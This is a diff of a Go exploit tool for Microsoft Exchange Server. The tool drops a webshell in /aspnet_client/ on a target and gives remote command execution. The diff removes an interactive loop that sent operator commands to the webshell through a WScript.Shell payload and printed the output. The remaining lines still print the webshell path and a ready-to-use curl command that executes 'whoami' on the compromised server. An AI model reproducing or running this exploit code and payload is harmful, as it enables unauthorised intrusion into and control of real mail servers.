@@ -4,7 +4,6 @@ package main
 // an unauthenticated attacker can execute arbitrary commands on Microsoft Exchange Server through an only opened 443 port!
 
 import (
-	"bufio"
 	"crypto/tls"
 	"errors"
 	"flag"
@@ -318,37 +317,6 @@ func getshell(target, mail, FQDN, sid string) {
 			if do5.StatusCode == 200 {
 				fmt.Println("[+] Webshell drop at " + target + "/aspnet_client/" + shell_name + " .. Have fun!")
 				fmt.Println("[+] Code: curl -ik " + target + "/aspnet_client/" + shell_name + ` -d 'lUc1f3r11=Response.Write(new ActiveXObject("WScript.Shell").exec("cmd /c whoami").stdout.readall())'`)
-				reader := bufio.NewReader(os.Stdin)
-				for {
-					fmt.Print("> ")
-					input, err := reader.ReadString('\n')
-					shell_body_exec := `lUc1f3r11=Response.Write(new ActiveXObject("WScript.Shell").exec("cmd /c ` + input + `").stdout.readall())`
-					request5, err := http.NewRequest(http.MethodPost, target+"/aspnet_client/"+shell_name, strings.NewReader(shell_body_exec))
-					if err != nil {
-						fmt.Println(err)
-					}
-					request5.Header.Add("Content-Type", "application/x-www-form-urlencoded")
-					request5.Header.Add("User-Agent", user_agent)
-
-					do5, err := cli.Do(request5)
-					if err != nil {
-						fmt.Println("[-] requesting err...")
-						return
-					}
-					if do5.StatusCode == 200 {
-						readres, _ := ioutil.ReadAll(do5.Body)
-						fmt.Println("[+] cmd exec results:\n")
-						fmt.Println("-----------------------")
-						fmt.Println(string(readres))
-					} else if do5.StatusCode == 500 {
-						fmt.Println("[-] AV block exec cmd!!")
-					} else {
-						fmt.Println("[-] Something wrong.. try again?")
-					}
-					if err = execShell(input); err != nil {
-						fmt.Fprintln(os.Stderr, err)
-					}
-				}
 			} else {
 				fmt.Println("[+] Webshell not found due to Covid, try again!")
 			}
